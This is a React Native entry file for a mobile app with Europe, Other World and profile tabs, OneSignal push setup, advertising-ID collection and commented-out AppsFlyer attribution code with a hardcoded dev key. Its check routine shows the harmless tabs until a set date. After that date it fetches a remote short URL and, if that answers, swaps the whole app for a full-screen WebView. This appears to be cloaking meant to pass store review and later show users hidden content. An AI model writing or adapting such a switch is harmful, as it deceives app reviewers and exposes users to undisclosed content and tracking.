import 'react-native-gesture-handler';
import React,{useState, useEffect, useRef} from "react";
import {Animated, StyleSheet, View, Text } from "react-native";


import { NavigationContainer } from '@react-navigation/native';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import { createStackNavigator } from '@react-navigation/stack';

import Europe from "./routs/Europe";
import OtherWorld from "./routs/OtherWorld";
import MyProfile from "./routs/MyProfile";
import WebViewScreen from "./routs/WebView";

import FontAwesome from 'react-native-vector-icons/FontAwesome';
import Fontisto from 'react-native-vector-icons/Fontisto';
import AntDesign from 'react-native-vector-icons/AntDesign';

import { LogLevel, OneSignal } from 'react-native-onesignal';
import ReactNativeIdfaAaid, { AdvertisingInfoResponse } from '@sparkfabrik/react-native-idfa-aaid';
import appsFlyer from 'react-native-appsflyer';

const Stack = createStackNavigator();
const Tab = createBottomTabNavigator();
//world

const useRoute = (isFatch) => {
  if (isFatch) {
    return (
      <Stack.Navigator >
        <Stack.Screen options={{ headerShown: false }} name="WebViewScreen" component={WebViewScreen} />
      </Stack.Navigator>
    )
  } return (
    <Tab.Navigator initialRouteName='Europe' screenOptions={{
      tabBarShowLabel: true,
      headerShown: false,
    }}>
      
      <Tab.Screen name="My Profile" component={MyProfile} options={{
        tabBarActiveBackgroundColor: '#36212c',
        tabBarInactiveBackgroundColor: '#8c1633',
        tabBarLabelStyle: {color: '#fff'},
        tabBarIcon: ({ focused }) => {
          return (
            <AntDesign name='profile' style={{color: focused ? '#fff' : '#fff', fontSize: 25}} />
          )
        }
      }}/>
        
      <Tab.Screen name="Europe" component={Europe} options={{
        tabBarActiveBackgroundColor: '#36212c',
        tabBarInactiveBackgroundColor: '#8c1633',
        tabBarLabelStyle: {color: '#fff'},
        tabBarIcon: ({ focused }) => {
          return (
            <FontAwesome name='euro' style={{color: focused ? '#fff' : '#fff', fontSize: 25}} />
          )
        }
      }}/>
      <Tab.Screen name="Other World" component={OtherWorld} options={{
        tabBarActiveBackgroundColor: '#36212c',
        tabBarInactiveBackgroundColor: '#8c1633',
        tabBarLabelStyle: {color: '#fff'},
        tabBarIcon: ({ focused }) => {
          return (
            <Fontisto name='world' style={{color: focused ? '#fff' : '#fff', fontSize: 25}} />
          )
        }
      }}/>
      
      
    </Tab.Navigator>
  )
};

{/** 

//1ST FUNCTION
function InitAppsflyer() {
  return new Promise((resolve, reject) => {
    appsFlyer.initSdk(
      {
        devKey: 'USAoqsTaaR8fEMYskDi3w',
        appId: '6472645168',
        isDebug: true,
        onInstallConversionDataListener: true, //Optional
        onDeepLinkListener: true, //Optional
        timeToWaitForATTUserAuthorization: 10, //for iOS 14.5
      },
      resolve,
      reject,
    );
  });
};

//2 FUNCTION
function GetUIDAppsflyer() {
  return new Promise((resolve, reject) => {
    appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
      if (err) {
        reject(err);
      } else {
        // console.log('on getAppsFlyerUID: ' + appsFlyerUID);

        resolve(appsFlyerUID);
      }
    });
  });
};

//3 FUNCTION
function GetAttributionInfoAppsflyer() {
  return new Promise((resolve, reject) => {
    const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
      res => {
        if (JSON.parse(res.data.is_first_launch) == true) {
          if (res.data.af_status === 'Non-organic') {
            var media_source = res.data.media_source;
            var af_adset = res.data.af_adset;
            var af_status = res.data.af_status;
            var af_channel = res.data.af_channel;
            var af_ad = res.data.af_ad;
            var af_os = res.data.af_os;
            var campaign = res.data.campaign;
            var konec = campaign + '_' + af_adset + '_' + af_ad + '_&kil=' + af_os;
            //   console.log(campaign);


          } else if (res.data.af_status === 'Organic') {
            //  console.log('This is first launch and a Organic Install');
          }
        } else {
          // console.log('This is not first launch');
        }

        // console.log('GetAttributionInfoAppsflyer end');
        return resolve(konec);
      },
    );
  });
};*/}

// pod install --repo-update
const App = () => {

  const [rout, setRout] = useState(null);
  const routnig = useRoute(rout);
  const [idfa, setIdfa] = useState(null);

  ////////////////////////////oneSignal
  useEffect(() => {
    ReactNativeIdfaAaid.getAdvertisingInfo()
      .then((res) =>
        !res.isAdTrackingLimited ? setIdfa(res.id) : setIdfa(null),
      )
      .catch((err) => {
        console.log(err);
        return setIdfa(null);
      });
  }, []);

  useEffect(() => {
    if (idfa) {
      // Метод для запиту дозволів на push-сповіщення
      OneSignal.Notifications.requestPermission(true);
    }
  }, [idfa]);
  //

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal Initialization
  OneSignal.initialize("e59d3bf9-2fca-48f8-ba4a-3aebf04f8777");

  // Method for listening for notification clicks
  OneSignal.Notifications.addEventListener('click', (event) => {
    console.log('OneSignal: notification clicked:', event);
  });

  //Add Data Tags
  OneSignal.User.addTag("key", "value");
  ///////////////////////////////////////////////////////////////////////
  
  //////////////////////////////////appsFlyer
  {/**
  useEffect(() => {
    // Цей код виконається при першому рендері компонента

    // Ініціалізація AppsFlyer
    InitAppsflyer()
      .then(() => {
        console.log('AppsFlyer ініціалізовано успішно');
        // Тут ви можете виконувати інші дії після ініціалізації AppsFlyer
      })
      .catch(error => {
        console.error('Помилка ініціалізації AppsFlyer:', error);
      });

    // Отримання UID AppsFlyer
    GetUIDAppsflyer()
      .then(uid => {
        console.log('UID AppsFlyer:', uid);
        // Тут ви можете виконувати інші дії з отриманим UID
      })
      .catch(error => {
        console.error('Помилка отримання UID AppsFlyer:', error);
      });

    // Отримання інформації про атрибуцію
    GetAttributionInfoAppsflyer()
      .then(attributionInfo => {
        console.log('Інформація про атрибуцію:', attributionInfo);
        // Тут ви можете виконувати інші дії з отриманою інформацією про атрибуцію
      })
      .catch(error => {
        console.error('Помилка отримання інформації про атрибуцію:', error);
      });

  }, []);
 */}


  //////////////////////////////////check
  useEffect(() => {
    //const checkUrl = 'https://reactnative.dev/docs/animated';
    const checkUrl = 'https://joa3.com/s8m2gj5z';
    const targetData = new Date('2023-12-03');//дата з якої поч працювати webView 
    const currentData = new Date();//текущая дата 

    if (currentData <= targetData) {
      setRout(false)
    } else (
      fetch(checkUrl).then(r => {
        if (r.status === 200) {
          setRout(true)
          //setIsLoading(false)
        } else {
          setRout(false)
          //setIsLoading(false)
        }
      }).catch(err => {
        console.log('error', err)
        setRout(false)

      })
    );
    
  })

  ////////////////////// код лоудера in sportBlog
  const [loaderIsLoaded, setLoaderIsLoaded] = useState(false);
  const ChangeInView = props => {
    // const fadeAnim = useRef(new Animated.Image(require('../../acets/loader1.jpg'))).current;
    
    const firstAnimImg = useRef(new Animated.Value(1)).current; // Initial value for opacity: 0 to 1
    useEffect(() => {
      Animated.timing(firstAnimImg, {
        toValue: 0,
        duration: 4500,
        useNativeDriver: true,
      }).start();
    }, []);

    const secondAnimImg = useRef(new Animated.Value(0)).current;// Initial value for opacity: 1 to 0
    useEffect(() => {
      Animated.timing(secondAnimImg, {
        toValue: 1,
        duration: 4500,
        useNativeDriver: true,
      }).start();
    }, []);

    const firdAnimImg = useRef(new Animated.Value(0)).current; // Initial value for opacity: 0 to 1
    useEffect(() => {
      setTimeout(() => {
        Animated.timing(firdAnimImg, {
          toValue: 1,
          duration: 4500,
          useNativeDriver: true,
        }).start();
      }, 3500);

      setTimeout(() => {
        setLoaderIsLoaded(true)
      }, 9500);
      
    }, []);

    return (
      <View style={{ position: 'relative', flex: 1 }}>
        <Animated.Image
          source={require('./accets/loader/loader_1.png')}// Special animatable View
          style={{
            ...props.style,
            opacity: firstAnimImg,
            //width: 'auto',
            height: '100%'  // Bind opacity to animated value
          }} />
        <Animated.Image
          source={require('./accets/loader/loader_2.png')}// Special animatable View
          style={{
            ...props.style,
            opacity: secondAnimImg,
            //width: '100%',
            height: '100%',
            position: 'absolute'// Bind opacity to animated value
          }} />
        <Animated.Image
          source={require('./accets/loader/loader_3.png')}// Special animatable View
          style={{
            ...props.style,
            opacity: firdAnimImg,
            //width: '100%',
            height: '100%',
            position: 'absolute'// Bind opacity to animated value
          }} />
      </View>
    
    );
  };
  /////////////////////////////////////

  

  return (
    <NavigationContainer>
      {!loaderIsLoaded ? (
        <ChangeInView
          style={{
            width: '100%',
            //height: 50,
            backgroundColor: 'powderblue',
          }}>
        </ChangeInView>
      ) : (
        routnig
      )}
      
    </NavigationContainer>
  );
};


export default App;

const styles = StyleSheet.create({
  conteiner: {
    flex: 1,
    backgroundColor: "#fff",
    alignItems: "center",
    justifyContent: "center"
  },

})
